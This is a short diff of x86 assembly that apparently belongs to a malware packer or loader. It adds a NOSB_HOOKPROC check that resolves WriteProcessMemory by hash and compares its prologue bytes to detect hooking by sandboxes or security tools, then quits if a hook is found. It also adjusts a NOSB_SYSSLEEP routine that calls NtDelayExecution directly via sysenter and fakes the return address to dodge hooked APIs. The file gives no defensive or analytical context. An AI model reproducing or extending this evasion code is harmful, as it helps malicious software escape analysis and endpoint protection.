@@ -132,6 +132,16 @@ _isnot_hyperstr:
 ; **
 ; ******************************************** 
 
+%ifdef NOSB_HOOKPROC
+	invoke _getdll,HASH_KERNEL32.DLL
+ 	invoke _getfunction, eax, HASH_WRITEPROCESSMEMORY
+  cmp dword [eax],0x8B55FF8B
+ 	je _nosbhookproc
+	ret
+_nosbhookproc:
+%endif
+
+
 %ifdef NOSB_SYSSLEEP
   	jmp	_syssleepstart
 		align 8
@@ -141,7 +151,7 @@ _syssleepstart:
 	  push syssleepval	; Time to sleep
 	  push 0						; False, relative time selection
 	  push _syssleepend	; Return address
-	  push _syssleepend	; Return address
+	  push _syssleepend	; Return address emulate return to ntdelayexecution
 		mov eax,0x003b		; Only for XP32 Bits...
 	  mov edx,esp				; See for code http://j00ru.vexillium.org/ntapi/
 		sysenter					; Hello Kernel
